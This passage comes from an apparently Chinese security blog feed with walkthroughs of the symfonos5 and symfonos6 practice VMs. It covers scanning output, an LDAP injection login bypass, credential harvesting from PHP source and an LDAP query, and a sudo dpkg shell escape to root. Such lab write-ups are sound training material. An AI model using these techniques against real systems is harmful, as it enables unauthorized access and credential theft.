class="line">|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">636/tcp open  ldapssl?</span><br><span class="line">MAC Address: 08:00:27:B3:88:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.23 ms symfonos5.lan (192.168.4.142)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.96 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./symfonos5/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.142/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     txt,php,html</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/28 05:03:04 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/home.php (Status: 302)</span><br><span class="line">/static (Status: 301)</span><br><span class="line">/admin.php (Status: 200)</span><br><span class="line">/logout.php (Status: 302)</span><br><span class="line">/portraits.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/28 05:06:40 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./symfonos5/2.png" alt></p>
<ul>
<li><a href="http://192.168.4.142/admin.php" target="_blank" rel="noopener">http://192.168.4.142/admin.php</a></li>
</ul>
<p><img data-src="./symfonos5/3.png" alt></p>
<h3 id="登录前端页面"><a href="#登录前端页面" class="headerlink" title="登录前端页面"></a>登录前端页面</h3><ul>
<li><code>LDAP注入</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 万能密码成功登录</span></span><br><span class="line">* / *</span><br></pre></td></tr></table></figure>

<ul>
<li>文件包含漏洞</li>
</ul>
<p><img data-src="./symfonos5/4.png" alt></p>
<p><img data-src="./symfonos5/5.png" alt></p>
<ul>
<li>发现可以远程文件包含(no)</li>
</ul>
<p><img data-src="./symfonos5/6.png" alt></p>
<h3 id="GetShell-失败"><a href="#GetShell-失败" class="headerlink" title="GetShell(失败)"></a>GetShell(失败)</h3><p><img data-src="./symfonos5/7.png" alt></p>
<p><img data-src="./symfonos5/8.png" alt></p>
<h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><p><img data-src="./symfonos5/9.png" alt></p>
<ul>
<li>查看<code>admin.php</code> 源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"loggedin"</span>]) &amp;&amp; $_SESSION[<span class="string">"loggedin"</span>] === <span class="keyword">true</span>)&#123;</span><br><span class="line">    header(<span class="string">"location: home.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authLdap</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">  $ldap_ch = ldap_connect(<span class="string">"ldap://172.18.0.22"</span>);</span><br><span class="line"></span><br><span class="line">  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!$ldap_ch) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $bind = ldap_bind($ldap_ch, <span class="string">"cn=admin,dc=symfonos,dc=local"</span>, <span class="string">"qMDdyZh3cT6eeAWD"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!$bind) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $filter = <span class="string">"(&amp;(uid=$username)(userPassword=$password))"</span>;</span><br><span class="line">  $result = ldap_search($ldap_ch, <span class="string">"dc=symfonos,dc=local"</span>, $filter);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $info = ldap_get_entries($ldap_ch, $result);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!($info) || ($info[<span class="string">"count"</span>] == <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">$username = urldecode($_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = urldecode($_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$bIsAuth = authLdap($username, $password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! $bIsAuth ) &#123;</span><br><span class="line">	$msg = <span class="string">"Invalid login"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $_SESSION[<span class="string">"loggedin"</span>] = <span class="keyword">true</span>;</span><br><span class="line">	header(<span class="string">"location: home.php"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"/static/bootstrap.min.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>获得<code>ldap</code>账号密码 <code>admin / qMDdyZh3cT6eeAWD</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 192.168.4.142</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/www/html# sudo nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 192.168.4.142</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-28 07:00 EDT</span><br><span class="line">Nmap scan report for symfonos5.lan (192.168.4.142)</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">389/tcp open  ldap</span><br><span class="line">| ldap-search: </span><br><span class="line">|   Context: dc=symfonos,dc=local</span><br><span class="line">|     dn: dc=symfonos,dc=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: dcObject</span><br><span class="line">|         objectClass: organization</span><br><span class="line">|         o: symfonos</span><br><span class="line">|         dc: symfonos</span><br><span class="line">|     dn: cn=admin,dc=symfonos,dc=local</span><br><span class="line">|         objectClass: simpleSecurityObject</span><br><span class="line">|         objectClass: organizationalRole</span><br><span class="line">|         cn: admin</span><br><span class="line">|         description: LDAP administrator</span><br><span class="line">|         userPassword: &#123;SSHA&#125;UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm</span><br><span class="line">|     dn: uid=zeus,dc=symfonos,dc=local</span><br><span class="line">|         uid: zeus</span><br><span class="line">|         cn: zeus</span><br><span class="line">|         sn: 3</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: posixAccount</span><br><span class="line">|         objectClass: inetOrgPerson</span><br><span class="line">|         loginShell: /bin/bash</span><br><span class="line">|         homeDirectory: /home/zeus</span><br><span class="line">|         uidNumber: 14583102</span><br><span class="line">|         gidNumber: 14564100</span><br><span class="line">|         userPassword: cetkKf4wCuHC9FET</span><br><span class="line">|         mail: zeus@symfonos.local</span><br><span class="line">|_        gecos: Zeus User</span><br><span class="line">MAC Address: 08:00:27:B3:88:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>获得账号密码<code>zeus / cetkKf4wCuHC9FET</code></li>
</ul>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./symfonos5/10.png" alt></p>
<p><img data-src="./symfonos5/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg -l</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos5/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>symfonos</tag>
      </tags>
  </entry>
  <entry>
    <title>symfonos6</title>
    <url>/2021/05/01/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos6/</url>
    <content><![CDATA[<h1 id="symfonos6"><a href="#symfonos6" class="headerlink" title="symfonos6"></a>symfonos6</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>symfonos6</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.43.172</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    be:63:96:5c:ed:50       (Unknown: locally administered)</span><br><span class="line">192.168.43.95   08:00:27:ea:19:2d       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.968 seconds (130.08 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.95</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.95</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sC -sV -p- 192.168.43.95</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-01 06:55 EDT</span><br><span class="line">Nmap scan report for 192.168.43.95</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)</span><br><span class="line">|   256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)</span><br><span class="line">|_  256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines, Help: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gitea=fb610f5b4ba9bbac; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=faMlsofzYpkEj-652NkUSaasnA06MTYxOTg2NjUzODczMDQyOTkxMQ; Path=/; Expires=Sun, 02 May 2021 10:55:38 GMT; HttpOnly</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Sat, 01 May 2021 10:55:38 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang="en-US"&gt;</span><br><span class="line">|     &lt;head data-suburl=""&gt;</span><br><span class="line">|     &lt;meta charset="utf-8"&gt;</span><br><span class="line">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</span><br><span class="line">|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">|     &lt;title&gt; Symfonos6&lt;/title&gt;</span><br><span class="line">|     &lt;link rel="manifest" href="/manifest.json" crossorigin="use-credentials"&gt;</span><br><span class="line">|     &lt;script&gt;</span><br><span class="line">|     ('serviceWorker' in navigator) &#123;</span><br><span class="line">|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) &#123;</span><br><span class="line">|     console.info('ServiceWorker registration successful with scope: ', registrat</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gitea=214b731a7bddfce8; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=7b0msz7W3t93cqjW-_uMAWlOiSg6MTYxOTg2NjU0Mzc4OTY2Njg4Ng; Path=/; Expires=Sun, 02 May 2021 10:55:43 GMT; HttpOnly</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Sat, 01 May 2021 10:55:43 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang="en-US"&gt;</span><br><span class="line">|     &lt;head data-suburl=""&gt;</span><br><span class="line">|     &lt;meta charset="utf-8"&gt;</span><br><span class="line">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</span><br><span class="line">|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">|     &lt;title&gt;Page Not Found - Symfonos6&lt;/title&gt;</span><br><span class="line">|     &lt;link rel="manifest" href="/manifest.json" crossorigin="use-credentials"&gt;</span><br><span class="line">|     &lt;script&gt;</span><br><span class="line">|     ('serviceWorker' in navigator) &#123;</span><br><span class="line">|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) &#123;</span><br><span class="line">|_    console.info('ServiceWorker registration successful</span><br><span class="line">3306/tcp open  mysql   MariaDB (unauthorized)</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/plain</span><br><span class="line">|     Date: Sat, 01 May 2021 10:56:08 GMT</span><br><span class="line">|     Content-Length: 18</span><br><span class="line">|     page not found</span><br><span class="line">|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/plain</span><br><span class="line">|     Date: Sat, 01 May 2021 10:55:38 GMT</span><br><span class="line">|     Content-Length: 18</span><br><span class="line">|     page not found</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/plain</span><br><span class="line">|     Date: Sat, 01 May 2021 10:55:53 GMT</span><br><span class="line">|     Content-Length: 18</span><br><span class="line">|_    page not found</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port3000-TCP:V=7.80%I=7%D=5/1%Time=608D33AA%P=x86_64-pc-linux-gnu%r(Gen</span><br><span class="line">SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te</span><br><span class="line">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2</span><br><span class="line">SF:0Request")%r(GetRequest,2924,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x</span><br><span class="line">SF:20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\</span><br><span class="line">SF:x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=fb610f5b4ba9bbac;\</span><br><span class="line">SF:x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=faMlsofzYpkEj-652NkUSaas</span><br><span class="line">SF:nA06MTYxOTg2NjUzODczMDQyOTkxMQ;\x20Path=/;\x20Expires=Sun,\x2002\x20May</span><br><span class="line">SF:\x202021\x2010:55:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORI</span><br><span class="line">SF:GIN\r\nDate:\x20Sat,\x2001\x20May\x202021\x2010:55:38\x20GMT\r\n\r\n&lt;!D</span><br><span class="line">SF:OCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"&gt;\n&lt;head\x20data-suburl=\"\"&gt;\n</span><br><span class="line">SF:\t&lt;meta\x20charset=\"utf-8\"&gt;\n\t&lt;meta\x20name=\"viewport\"\x20content=</span><br><span class="line">SF:\"width=device-width,\x20initial-scale=1\"&gt;\n\t&lt;meta\x20http-equiv=\"x-</span><br><span class="line">SF:ua-compatible\"\x20content=\"ie=edge\"&gt;\n\t&lt;title&gt;\x20Symfonos6&lt;/title&gt;</span><br><span class="line">SF:\n\t&lt;link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigi</span><br><span class="line">SF:n=\"use-credentials\"&gt;\n\t\n\t&lt;script&gt;\n\t\tif\x20\('serviceWorker'\x20</span><br><span class="line">SF:in\x20navigator\)\x20&#123;\n\t\t\tnavigator\.serviceWorker\.register\('/ser</span><br><span class="line">SF:viceworker\.js'\)\.then\(function\(registration\)\x20&#123;\n\t\t\t\t\n\t\t\</span><br><span class="line">SF:t\tconsole\.info\('ServiceWorker\x20registration\x20successful\x20with\</span><br><span class="line">SF:x20scope:\x20',\x20registrat")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Re</span><br><span class="line">SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x</span><br><span class="line">SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,216B,"HTTP/1\.0\x2</span><br><span class="line">SF:0404\x20Not\x20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\</span><br><span class="line">SF:nSet-Cookie:\x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Coo</span><br><span class="line">SF:kie:\x20i_like_gitea=214b731a7bddfce8;\x20Path=/;\x20HttpOnly\r\nSet-Co</span><br><span class="line">SF:okie:\x20_csrf=7b0msz7W3t93cqjW-_uMAWlOiSg6MTYxOTg2NjU0Mzc4OTY2Njg4Ng;\</span><br><span class="line">SF:x20Path=/;\x20Expires=Sun,\x2002\x20May\x202021\x2010:55:43\x20GMT;\x20</span><br><span class="line">SF:HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2001\x20Ma</span><br><span class="line">SF:y\x202021\x2010:55:43\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\</span><br><span class="line">SF:"en-US\"&gt;\n&lt;head\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\</span><br><span class="line">SF:t&lt;meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial</span><br><span class="line">SF:-scale=1\"&gt;\n\t&lt;meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=</span><br><span class="line">SF:edge\"&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Symfonos6&lt;/title&gt;\n\</span><br><span class="line">SF:t&lt;link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\</span><br><span class="line">SF:"use-credentials\"&gt;\n\t\n\t&lt;script&gt;\n\t\tif\x20\('serviceWorker'\x20in\</span><br><span class="line">SF:x20navigator\)\x20&#123;\n\t\t\tnavigator\.serviceWorker\.register\('/servic</span><br><span class="line">SF:eworker\.js'\)\.then\(function\(registration\)\x20&#123;\n\t\t\t\t\n\t\t\t\t</span><br><span class="line">SF:console\.info\('ServiceWorker\x20registration\x20successful\x20");</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port5000-TCP:V=7.80%I=7%D=5/1%Time=608D33AA%P=x86_64-pc-linux-gnu%r(Gen</span><br><span class="line">SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te</span><br><span class="line">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2</span><br><span class="line">SF:0Request")%r(GetRequest,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent</span><br><span class="line">SF:-Type:\x20text/plain\r\nDate:\x20Sat,\x2001\x20May\x202021\x2010:55:38\</span><br><span class="line">SF:x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found")%r(</span><br><span class="line">SF:RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20</span><br><span class="line">SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\</span><br><span class="line">SF:x20Request")%r(HTTPOptions,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCont</span><br><span class="line">SF:ent-Type:\x20text/plain\r\nDate:\x20Sat,\x2001\x20May\x202021\x2010:55:</span><br><span class="line">SF:53\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found")</span><br><span class="line">SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text</span><br><span class="line">SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R</span><br><span class="line">SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont</span><br><span class="line">SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r</span><br><span class="line">SF:\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x</span><br><span class="line">SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo</span><br><span class="line">SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"H</span><br><span class="line">SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch</span><br><span class="line">SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ke</span><br><span class="line">SF:rberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/</span><br><span class="line">SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re</span><br><span class="line">SF:quest")%r(FourOhFourRequest,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCon</span><br><span class="line">SF:tent-Type:\x20text/plain\r\nDate:\x20Sat,\x2001\x20May\x202021\x2010:56</span><br><span class="line">SF::08\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found"</span><br><span class="line">SF:)%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x</span><br><span class="line">SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba</span><br><span class="line">SF:d\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r</span><br><span class="line">SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close</span><br><span class="line">SF:\r\n\r\n400\x20Bad\x20Request");</span><br><span class="line">MAC Address: 08:00:27:EA:19:2D (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 96.34 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./symfonos6/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.95/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/symfonos6# gobuster dir -u http://192.168.43.95/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.95/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/01 06:57:27 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/posts (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/01 06:59:57 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.95:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span 